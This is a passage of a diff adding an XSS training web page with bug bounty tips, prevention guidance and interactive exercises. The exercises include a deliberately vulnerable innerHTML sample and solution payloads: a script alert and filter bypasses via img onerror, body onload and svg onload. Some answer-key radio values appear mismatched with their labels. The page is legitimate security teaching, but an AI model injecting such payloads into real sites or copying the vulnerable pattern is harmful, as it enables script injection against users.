+                  nature, the potential impact was particularly severe.
+                </p>
+              </div>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Bug Bounty Tips for Finding XSS Vulnerabilities
+            </h3>
+            <div class="mb-6">
+              <ol class="list-decimal pl-6 space-y-3">
+                <li>
+                  <strong>Test All Input Points</strong>
+                  <p class="text-sm">
+                    Every input field, URL parameter, HTTP header, and form
+                    submission is a potential entry point for XSS. Test them all
+                    systematically.
+                  </p>
+                </li>
+                <li>
+                  <strong>Try Different Contexts</strong>
+                  <p class="text-sm">
+                    The same XSS payload may work differently depending on where
+                    it's inserted (in HTML, in JavaScript, in attributes, etc.).
+                    Adapt your approach based on the context.
+                  </p>
+                </li>
+                <li>
+                  <strong>Bypass Filters</strong>
+                  <p class="text-sm">
+                    Many applications implement basic XSS filters that can be
+                    bypassed. Try encoding variations, different event handlers,
+                    and creative syntax.
+                  </p>
+                </li>
+                <li>
+                  <strong>Check JavaScript Libraries</strong>
+                  <p class="text-sm">
+                    Applications often use JavaScript libraries with known
+                    vulnerabilities. Identify which libraries are in use and
+                    research known XSS issues.
+                  </p>
+                </li>
+                <li>
+                  <strong>Understand the Application</strong>
+                  <p class="text-sm">
+                    Take time to understand how the application works,
+                    especially its data flow and user input handling. This
+                    knowledge can reveal less obvious attack vectors.
+                  </p>
+                </li>
+              </ol>
+            </div>
+
+            <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
+              <div class="flex">
+                <div class="flex-shrink-0">
+                  <svg
+                    class="h-5 w-5 text-yellow-400"
+                    xmlns="http://www.w3.org/2000/svg"
+                    viewBox="0 0 20 20"
+                    fill="currentColor"
+                  >
+                    <path
+                      fill-rule="evenodd"
+                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z"
+                      clip-rule="evenodd"
+                    />
+                  </svg>
+                </div>
+                <div class="ml-3">
+                  <p class="text-sm text-yellow-700">
+                    <strong>Responsible Disclosure:</strong> When finding XSS
+                    vulnerabilities, always follow responsible disclosure
+                    practices. Report the issue to the affected organization
+                    through their bug bounty program or security contact before
+                    disclosing it publicly.
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Bug Bounty Resources for XSS
+            </h3>
+            <ul class="list-disc pl-6 mb-4 space-y-2">
+              <li>
+                <strong>HackerOne:</strong>
+                <a
+                  href="https://www.hackerone.com/hackactivity"
+                  class="text-blue-600 hover:underline"
+                  target="_blank"
+                  >Public bug reports</a
+                >
+                include many XSS findings with detailed explanations
+              </li>
+              <li>
+                <strong>Bugcrowd:</strong>
+                <a
+                  href="https://www.bugcrowd.com/bug-bounty-list/"
+                  class="text-blue-600 hover:underline"
+                  target="_blank"
+                  >Bug bounty programs</a
+                >
+                often target XSS vulnerabilities
+              </li>
+              <li>
+                <strong>PortSwigger Research:</strong>
+                <a
+                  href="https://portswigger.net/research"
+                  class="text-blue-600 hover:underline"
+                  target="_blank"
+                  >Research articles</a
+                >
+                on advanced XSS techniques
+              </li>
+              <li>
+                <strong>OWASP XSS Filter Evasion Cheat Sheet:</strong>
+                <a
+                  href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet"
+                  class="text-blue-600 hover:underline"
+                  target="_blank"
+                  >Techniques for bypassing XSS filters</a
+                >
+              </li>
+            </ul>
+          </div>
+        </section>
+
+        <!-- Interactive Exercises Section -->
+        <section id="exercises" class="bg-white rounded-lg shadow-md p-6 mb-8">
+          <div
+            class="section-header flex justify-between items-center cursor-pointer"
+            onclick="toggleSection('exercises-content')"
+          >
+            <h2 class="text-2xl font-bold text-blue-600">
+              4. Interactive Exercises
+            </h2>
+            <svg
+              class="w-6 h-6 text-blue-500 transform transition-transform"
+              id="exercises-icon"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M19 9l-7 7-7-7"
+              />
+            </svg>
+          </div>
+          <div id="exercises-content" class="section-content active mt-4">
+            <p class="mb-6">
+              Let's put your XSS knowledge to the test with some interactive
+              exercises. These simulations will help you practice identifying
+              and exploiting XSS vulnerabilities in a safe environment.
+            </p>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Exercise 1: Find the Vulnerability
+              </h3>
+              <div class="bg-gray-100 p-6 rounded-lg">
+                <p class="mb-4">
+                  Examine the following code snippets and identify which ones
+                  contain XSS vulnerabilities. Click the "Check" button after
+                  selecting your answers.
+                </p>
+
+                <div class="space-y-6 mb-4">
+                  <div class="code-exercise p-4 bg-white rounded border">
+                    <h4 class="font-semibold mb-2">Code Sample 1:</h4>
+                    <div class="code-block bg-gray-800 rounded-md mb-3">
+                      <pre><code class="language-html">&lt;script&gt;
+const userInput = document.getElementById('search').value;
+document.getElementById('results').innerText = 'Results for: ' + userInput;
+&lt;/script&gt;</code></pre>
+                    </div>
+                    <div class="flex items-center">
+                      <input
+                        type="radio"
+                        name="exercise1-1"
+                        id="ex1-1-yes"
+                        value="no"
+                      />
+                      <label for="ex1-1-yes" class="ml-2 mr-4"
+                        >Vulnerable</label
+                      >
+                      <input
+                        type="radio"
+                        name="exercise1-1"
+                        id="ex1-1-no"
+                        value="yes"
+                      />
+                      <label for="ex1-1-no" class="ml-2">Not Vulnerable</label>
+                    </div>
+                    <p id="exercise1-1-feedback" class="mt-2 hidden"></p>
+                  </div>
+
+                  <div class="code-exercise p-4 bg-white rounded border">
+                    <h4 class="font-semibold mb-2">Code Sample 2:</h4>
+                    <div class="code-block bg-gray-800 rounded-md mb-3">
+                      <pre><code class="language-html">&lt;script&gt;
+const userComment = document.getElementById('comment').value;
+document.getElementById('comments').innerHTML += '&lt;div class="comment"&gt;' + userComment + '&lt;/div&gt;';
+&lt;/script&gt;</code></pre>
+                    </div>
+                    <div class="flex items-center">
+                      <input
+                        type="radio"
+                        name="exercise1-2"
+                        id="ex1-2-yes"
+                        value="yes"
+                      />
+                      <label for="ex1-2-yes" class="ml-2 mr-4"
+                        >Vulnerable</label
+                      >
+                      <input
+                        type="radio"
+                        name="exercise1-2"
+                        id="ex1-2-no"
+                        value="no"
+                      />
+                      <label for="ex1-2-no" class="ml-2">Not Vulnerable</label>
+                    </div>
+                    <p id="exercise1-2-feedback" class="mt-2 hidden"></p>
+                  </div>
+
+                  <div class="code-exercise p-4 bg-white rounded border">
+                    <h4 class="font-semibold mb-2">Code Sample 3:</h4>
+                    <div class="code-block bg-gray-800 rounded-md mb-3">
+                      <pre><code class="language-html">&lt;?php
+$username = htmlspecialchars($_GET['username'], ENT_QUOTES, 'UTF-8');
+echo "&lt;h1&gt;Welcome, {$username}!&lt;/h1&gt;";
+?&gt;</code></pre>
+                    </div>
+                    <div class="flex items-center">
+                      <input
+                        type="radio"
+                        name="exercise1-3"
+                        id="ex1-3-yes"
+                        value="no"
+                      />
+                      <label for="ex1-3-yes" class="ml-2 mr-4"
+                        >Vulnerable</label
+                      >
+                      <input
+                        type="radio"
+                        name="exercise1-3"
+                        id="ex1-3-no"
+                        value="yes"
+                      />
+                      <label for="ex1-3-no" class="ml-2">Not Vulnerable</label>
+                    </div>
+                    <p id="exercise1-3-feedback" class="mt-2 hidden"></p>
+                  </div>
+                </div>
+
+                <button
+                  onclick="checkExercise1()"
+                  class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded"
+                >
+                  Check Answers
+                </button>
+                <p id="exercise1-result" class="mt-4 hidden"></p>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Exercise 2: Develop a Payload
+              </h3>
+              <div class="bg-gray-100 p-6 rounded-lg">
+                <p class="mb-4">
+                  For this exercise, you'll need to develop an XSS payload that
+                  achieves specific objectives. You can test your payload in the
+                  sandbox below.
+                </p>
+
+                <div class="mb-4 p-4 bg-white rounded border">
+                  <h4 class="font-semibold mb-2">Scenario:</h4>
+                  <p>
+                    You've found a reflected XSS vulnerability in a website's
+                    search function. Your goal is to create a payload that:
+                  </p>
+                  <ol class="list-decimal pl-6 mt-2">
+                    <li>Displays an alert with the text "XSS Successful"</li>
+                    <li>Changes the background color of the page to red</li>
+                  </ol>
+                </div>
+
+                <div class="mb-4">
+                  <h4 class="font-semibold mb-2">Test your payload:</h4>
+                  <textarea
+                    id="xss-payload"
+                    class="w-full p-2 border rounded"
+                    rows="3"
+                    placeholder="Enter your XSS payload here"
+                  ></textarea>
+                  <button
+                    onclick="testPayload()"
+                    class="mt-2 bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded"
+                  >
+                    Test Payload
+                  </button>
+                </div>
+
+                <div class="mt-4">
+                  <h4 class="font-semibold mb-2">Result:</h4>
+                  <div
+                    id="payload-sandbox"
+                    class="p-4 bg-white border rounded-md min-h-[100px]"
+                  >
+                    <p class="text-gray-500">
+                      Your payload results will appear here...
+                    </p>
+                  </div>
+                </div>
+
+                <div class="mt-4">
+                  <button
+                    onclick="revealSolution()"
+                    class="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded"
+                  >
+                    Reveal Solution
+                  </button>
+                  <div
+                    id="payload-solution"
+                    class="mt-2 hidden p-4 bg-gray-200 rounded"
+                  >
+                    <h4 class="font-semibold mb-2">Solution:</h4>
+                    <div class="code-block bg-gray-800 rounded-md">
+                      <button
+                        class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                        onclick="copyCode(this)"
+                      >
+                        Copy
+                      </button>
+                      <pre><code class="language-html">&lt;script&gt;alert("XSS Successful"); document.body.style.backgroundColor = "red";&lt;/script&gt;</code></pre>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Exercise 3: Bypass XSS Filters
+              </h3>
+              <div class="bg-gray-100 p-6 rounded-lg">
+                <p class="mb-4">
+                  This exercise will test your ability to bypass basic XSS
+                  filters. The example filter blocks the
+                  <code>&lt;script&gt;</code> tag and the
+                  <code>javascript:</code> protocol, but can still be bypassed.
+                </p>
+
+                <div class="mb-4 p-4 bg-white rounded border">
+                  <h4 class="font-semibold mb-2">Filter Rules:</h4>
+                  <ul class="list-disc pl-6">
+                    <li>
+                      The string <code>&lt;script</code> is blocked
+                      (case-insensitive)
+                    </li>
+                    <li>
+                      The string <code>javascript:</code> is blocked
+                      (case-insensitive)
+                    </li>
+                    <li>Other tags and events are allowed</li>
+                  </ul>
+                </div>
+
+                <div class="mb-4">
+                  <h4 class="font-semibold mb-2">Test your bypass:</h4>
+                  <textarea
+                    id="bypass-payload"
+                    class="w-full p-2 border rounded"
+                    rows="3"
+                    placeholder="Enter your filter bypass payload here"
+                  ></textarea>
+                  <button
+                    onclick="testBypass()"
+                    class="mt-2 bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded"
+                  >
+                    Test Bypass
+                  </button>
+                </div>
+
+                <div class="mt-4">
+                  <h4 class="font-semibold mb-2">Result:</h4>
+                  <div
+                    id="bypass-result"
+                    class="p-4 bg-white border rounded-md"
+                  >
+                    <p class="text-gray-500">
+                      Your bypass results will appear here...
+                    </p>
+                  </div>
+                </div>
+
+                <div class="mt-4">
+                  <button
+                    onclick="revealBypassSolution()"
+                    class="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded"
+                  >
+                    Reveal Solution
+                  </button>
+                  <div
+                    id="bypass-solution"
+                    class="mt-2 hidden p-4 bg-gray-200 rounded"
+                  >
+                    <h4 class="font-semibold mb-2">Solution Examples:</h4>
+                    <div class="code-block bg-gray-800 rounded-md mb-2">
+                      <button
+                        class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                        onclick="copyCode(this)"
+                      >
+                        Copy
+                      </button>
+                      <pre><code class="language-html">&lt;img src="x" onerror="alert('XSS Bypass')"&gt;</code></pre>
+                    </div>
+                    <div class="code-block bg-gray-800 rounded-md mb-2">
+                      <button
+                        class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                        onclick="copyCode(this)"
+                      >
+                        Copy
+                      </button>
+                      <pre><code class="language-html">&lt;body onload="alert('XSS Bypass')"&gt;</code></pre>
+                    </div>
+                    <div class="code-block bg-gray-800 rounded-md">
+                      <button
+                        class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                        onclick="copyCode(this)"
+                      >
+                        Copy
+                      </button>
+                      <pre><code class="language-html">&lt;svg onload="alert('XSS Bypass')"&gt;</code></pre>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Prevention Techniques Section -->
+        <section id="prevention" class="bg-white rounded-lg shadow-md p-6 mb-8">
+          <div
+            class="section-header flex justify-between items-center cursor-pointer"
+            onclick="toggleSection('prevention-content')"
+          >
+            <h2 class="text-2xl font-bold text-blue-600">
+              5. Prevention Techniques
+            </h2>
+            <svg
+              class="w-6 h-6 text-blue-500 transform transition-transform"
+              id="prevention-icon"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M19 9l-7 7-7-7"
+              />
+            </svg>
+          </div>
+          <div id="prevention-content" class="section-content active mt-4">
+            <p class="mb-6">
+              Preventing XSS vulnerabilities is essential for building secure
+              web applications. This section covers the most effective
+              techniques for defending against all types of XSS attacks.
+            </p>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Input Validation
+              </h3>
+              <p class="mb-4">
+                Always validate user input on the server side to ensure it meets
+                expected formats and criteria.
+              </p>
+
+              <div class="flex flex-col md:flex-row gap-6">
+                <div class="md:w-1/2 bg-green-50 p-4 rounded-lg">
+                  <h4 class="font-semibold text-green-700 mb-2">
+                    Good Practice
+                  </h4>
+                  <div class="code-block bg-gray-800 rounded-md">
+                    <button
+                      class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                      onclick="copyCode(this)"
+                    >
+                      Copy
+                    </button>
+                    <pre><code class="language-html">&lt;?php
+// Validate that input is an integer
+if (!is_numeric($_GET['id'])) {
+    die("Invalid input");
+}
+$id = (int)$_GET['id'];
+// Use $id safely
+?&gt;</code></pre>
+                  </div>
+                </div>
+                <div class="md:w-1/2 bg-red-50 p-4 rounded-lg">
+                  <h4 class="font-semibold text-red-700 mb-2">Bad Practice</h4>
+                  <div class="code-block bg-gray-800 rounded-md">
+                    <button
+                      class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                      onclick="copyCode(this)"
+                    >
+                      Copy
+                    </button>
+                    <pre><code class="language-html">&lt;?php
+// No validation, direct use of input
+$id = $_GET['id'];
+// Use $id unsafely
+?&gt;</code></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Output Encoding
+              </h3>
+              <p class="mb-4">
+                Encode output based on the context where it will be rendered to
+                prevent script execution.
+              </p>
+
+              <div class="overflow-x-auto mb-6">
+                <table class="min-w-full bg-white border border-gray-200">
+                  <thead>
+                    <tr>
+                      <th
+                        class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                      >
+                        Context
+                      </th>
+                      <th
+                        class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                      >
+                        Encoding Method
+                      </th>
+                      <th
+                        class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                      >
+                        Example
+                      </th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        HTML Content
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        HTML Entity Encoding
+                      </td>
+                      <td
+                        class="py-2 px-4 border-b border-gray-200 text-sm font-mono text-xs"
+                      >
+                        htmlspecialchars($data, ENT_QUOTES, 'UTF-8')
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        HTML Attributes
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        HTML Attribute Encoding
+                      </td>
+                      <td
+                        class="py-2 px-4 border-b border-gray-200 text-sm font-mono text-xs"
+                      >
+                        htmlspecialchars($data, ENT_QUOTES, 'UTF-8')
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        JavaScript
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        JavaScript Encoding
+                      </td>
+                      <td
+                        class="py-2 px-4 border-b border-gray-200 text-sm font-mono text-xs"
+                      >
+                        json_encode($data)
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        URL Parameters
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        URL Encoding
+                      </td>
+                      <td
+                        class="py-2 px-4 border-b border-gray-200 text-sm font-mono text-xs"
+                      >
+                        urlencode($data)
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        CSS
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        CSS Hex Encoding
+                      </td>
+                      <td
+                        class="py-2 px-4 border-b border-gray-200 text-sm font-mono text-xs"
+                      >
+                        Custom CSS escaping function
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+
+              <div class="flex flex-col md:flex-row gap-6">
+                <div class="md:w-1/2 bg-green-50 p-4 rounded-lg">
+                  <h4 class="font-semibold text-green-700 mb-2">
+                    Good Practice
+                  </h4>
+                  <div class="code-block bg-gray-800 rounded-md">
+                    <button
+                      class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                      onclick="copyCode(this)"
+                    >
+                      Copy
+                    </button>
+                    <pre><code class="language-html">&lt;?php
+// HTML context
+echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
+
+// JavaScript context
+echo "var userInput = " . json_encode($userInput) . ";";
+?&gt;</code></pre>
+                  </div>
+                </div>
+                <div class="md:w-1/2 bg-red-50 p-4 rounded-lg">
+                  <h4 class="font-semibold text-red-700 mb-2">Bad Practice</h4>
+                  <div class="code-block bg-gray-800 rounded-md">
+                    <button
+                      class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                      onclick="copyCode(this)"
+                    >
+                      Copy
+                    </button>
+                    <pre><code class="language-html">&lt;?php
+// Direct output without encoding
+echo $userInput;
+
+// Unencoded JavaScript
+echo "var userInput = '" . $userInput . "';";
+?&gt;</code></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Content Security Policy (CSP)
+              </h3>
+              <p class="mb-4">
+                Content Security Policy is a powerful browser feature that helps
+                prevent XSS attacks by controlling which resources can be loaded
+                and executed on your page.
+              </p>
+
+              <div class="bg-gray-50 p-4 rounded-lg mb-4">
+                <h4 class="font-semibold mb-2">Example CSP Header</h4>
+                <div class="code-block bg-gray-800 rounded-md">
+                  <button
+                    class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                    onclick="copyCode(this)"
+                  >
+                    Copy
+                  </button>
+                  <pre><code class="language-html">Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'; style-src 'self' https://trusted-cdn.com;</code></pre>
+                </div>
+              </div>
+
+              <p class="mb-4">The above CSP header does the following:</p>
+              <ul class="list-disc pl-6 mb-4 space-y-1">
+                <li>
+                  Restricts scripts to load only from the same origin and a
+                  trusted CDN
+                </li>
+                <li>Blocks all plugin content (object-src 'none')</li>
+                <li>
+                  Allows stylesheets only from the same origin and a trusted CDN
+                </li>
+                <li>
+                  For all other resource types, only allows loading from the
+                  same origin
+                </li>
+              </ul>
+
+              <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
+                <div class="flex">
+                  <div class="flex-shrink-0">
+                    <svg
+                      class="h-5 w-5 text-yellow-400"
+                      xmlns="http://www.w3.org/2000/svg"
+                      viewBox="0 0 20 20"
+                      fill="currentColor"
+                    >
+                      <path
+                        fill-rule="evenodd"
+                        d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z"
+                        clip-rule="evenodd"
+                      />
+                    </svg>
+                  </div>
+                  <div class="ml-3">
+                    <p class="text-sm text-yellow-700">
+                      <strong>Note:</strong> While CSP is a strong defense
+                      against XSS, it should be used in combination with proper
+                      input validation and output encoding, not as a
+                      replacement.
+                    </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Framework-specific Protections
+              </h3>
+              <p class="mb-4">
+                Modern web frameworks often include built-in XSS protections
+                that you should leverage.
+              </p>
+
+              <div class="overflow-x-auto mb-6">
+                <table class="min-w-full bg-white border border-gray-200">
+                  <thead>
+                    <tr>
+                      <th
+                        class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                      >
+                        Framework
+                      </th>
+                      <th
+                        class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                      >
+                        Protection Features
+                      </th>
+                      <th
+                        class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                      >
+                        Example
+                      </th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        React
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Automatic escaping of values in JSX
+                      </td>
+                      <td
+                        class="py-2 px-4 border-b border-gray-200 text-sm font-mono text-xs"
+                      >
+                        &lt;div&gt;{userInput}&lt;/div&gt;
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Angular
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Automatic sanitization with property binding
+                      </td>
+                      <td
+                        class="py-2 px-4 border-b border-gray-200 text-sm font-mono text-xs"
+                      >
+                        &lt;div [innerText]="userInput"&gt;&lt;/div&gt;
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Django
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Auto-escaping in templates
+                      </td>
+                      <td
+                        class="py-2 px-4 border-b border-gray-200 text-sm font-mono text-xs"
+                      >
+                        {{ user_input }}
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Laravel
+                      </td>
+                      <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                        Blade template escaping
+                      </td>
+                      <td
+                        class="py-2 px-4 border-b border-gray-200 text-sm font-mono text-xs"
+                      >
+                        {{ $userInput }}
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+
+              <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
+                <div class="flex">
+                  <div class="flex-shrink-0">
+                    <svg
+                      class="h-5 w-5 text-yellow-400"
+                      xmlns="http://www.w3.org/2000/svg"
+                      viewBox="0 0 20 20"
+                      fill="currentColor"
+                    >
+                      <path
+                        fill-rule="evenodd"
+                        d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z"
+                        clip-rule="evenodd"
+                      />
+                    </svg>
+                  </div>
+                  <div class="ml-3">
+                    <p class="text-sm text-yellow-700">
+                      <strong>Warning:</strong> Be cautious of framework
+                      features that bypass the default protections, such as
+                      React's <code>dangerouslySetInnerHTML</code> or Angular's
+                      <code>[innerHTML]</code>.
+                    </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                XSS Prevention Checklist
+              </h3>
+              <div class="bg-gray-50 p-4 rounded-lg">
+                <ul class="space-y-2">
+                  <li class="checkpoint-item" id="checkpoint1">
+                    <strong>Validate all user input</strong>
+                    <p class="text-sm text-gray-600">
+                      Implement server-side validation for all user inputs,
+                      including URL parameters, form fields, and HTTP headers.
+                    </p>
+                  </li>
+                  <li class="checkpoint-item" id="checkpoint2">
+                    <strong>Use appropriate output encoding</strong>
+                    <p class="text-sm text-gray-600">
+                      Encode user-controlled data based on the context where it
+                      will be displayed (HTML, JavaScript, CSS, etc.).
+                    </p>
+                  </li>
+                  <li class="checkpoint-item" id="checkpoint3">
+                    <strong>Implement Content Security Policy</strong>
+                    <p class="text-sm text-gray-600">
+                      Set up a strong CSP to restrict script sources and other
+                      resources.
+                    </p>
+                  </li>
+                  <li class="checkpoint-item" id="checkpoint4">
+                    <strong>Use framework security features</strong>
+                    <p class="text-sm text-gray-600">
+                      Leverage the built-in XSS protections provided by your web
+                      framework.
+                    </p>
+                  </li>
+                  <li class="checkpoint-item" id="checkpoint5">
+                    <strong>Apply the principle of least privilege</strong>
+                    <p class="text-sm text-gray-600">
+                      Only use dangerous functions (innerHTML, eval, etc.) when
+                      absolutely necessary and with proper safeguards.
+                    </p>
+                  </li>
+                  <li class="checkpoint-item" id="checkpoint6">
+                    <strong>Sanitize HTML</strong>
+                    <p class="text-sm text-gray-600">
+                      Use an HTML sanitizer library if you need to allow some
+                      HTML content from users.
+                    </p>
+                  </li>
+                  <li class="checkpoint-item" id="checkpoint7">
+                    <strong>Set secure cookies</strong>
+                    <p class="text-sm text-gray-600">
+                      Use HttpOnly and Secure flags on cookies to prevent
+                      JavaScript access and transmission over insecure
+                      connections.
+                    </p>
+                  </li>
+                  <li class="checkpoint-item" id="checkpoint8">
+                    <strong>Regularly audit your code</strong>
+                    <p class="text-sm text-gray-600">
+                      Conduct security code reviews and perform penetration
+                      testing to find XSS vulnerabilities.
+                    </p>
+                  </li>
+                </ul>
+                <button
+                  onclick="toggleCheckpoints()"
+                  class="mt-4 bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded"
+                >
+                  Toggle Checkpoint Completion
+                </button>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Additional Resources Section -->
+        <section id="additional" class="bg-white rounded-lg shadow-md p-6 mb-8">
+          <div
+            class="section-header flex justify-between items-center cursor-pointer"
+            onclick="toggleSection('additional-content')"
+          >
+            <h2 class="text-2xl font-bold text-blue-600">
+              6. Additional Resources
+            </h2>
+            <svg
+              class="w-6 h-6 text-blue-500 transform transition-transform"
+              id="additional-icon"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M19 9l-7 7-7-7"
+              />
+            </svg>
+          </div>
+          <div id="additional-content" class="section-content active mt-4">
+            <p class="mb-6">
+              To further enhance your XSS knowledge and skills, here are some
+              valuable resources and tools:
+            </p>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Learning Resources
+              </h3>
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="p-4 bg-gray-50 rounded-lg">
+                  <h4 class="font-semibold mb-2">OWASP XSS</h4>
+                  <p class="text-sm mb-2">
+                    Comprehensive information about XSS from the Open Web
+                    Application Security Project
+                  </p>
+                  <a
+                    href="https://owasp.org/www-community/attacks/xss/"
+                    class="text-blue-600 hover:underline text-sm"
+                    target="_blank"
+                    >Visit Website</a
+                  >
+                </div>
+                <div class="p-4 bg-gray-50 rounded-lg">
+                  <h4 class="font-semibold mb-2">
+                    PortSwigger Web Security Academy
+                  </h4>
+                  <p class="text-sm mb-2">
+                    Free interactive labs for practicing XSS and other web
+                    vulnerabilities
+                  </p>
+                  <a
+                    href="https://portswigger.net/web-security/cross-site-scripting"
+                    class="text-blue-600 hover:underline text-sm"
+                    target="_blank"
+                    >Visit Website</a
+                  >
+                </div>
+                <div class="p-4 bg-gray-50 rounded-lg">
+                  <h4 class="font-semibold mb-2">
+                    OWASP XSS Filter Evasion Cheat Sheet
+                  </h4>
+                  <p class="text-sm mb-2">
+                    A collection of XSS vectors that can help bypass various
+                    filters
+                  </p>
+                  <a
+                    href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet"
+                    class="text-blue-600 hover:underline text-sm"
+                    target="_blank"
+                    >Visit Website</a
+                  >
+                </div>
+                <div class="p-4 bg-gray-50 rounded-lg">
+                  <h4 class="font-semibold mb-2">HackerOne Hacktivity</h4>
+                  <p class="text-sm mb-2">
+                    Public bug reports including many XSS vulnerabilities with
+                    detailed explanations
+                  </p>
+                  <a
+                    href="https://hackerone.com/hacktivity"
+                    class="text-blue-600 hover:underline text-sm"
+                    target="_blank"
+                    >Visit Website</a
+                  >
+                </div>
+              </div>
+            </div>
+
+            <div class="mb-8">
+              <h3 class="text-xl font-semibold text-blue-700 mb-3">
+                Practice Platforms
+              </h3>
+              <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div class="p-4 bg-gray-50 rounded-lg">
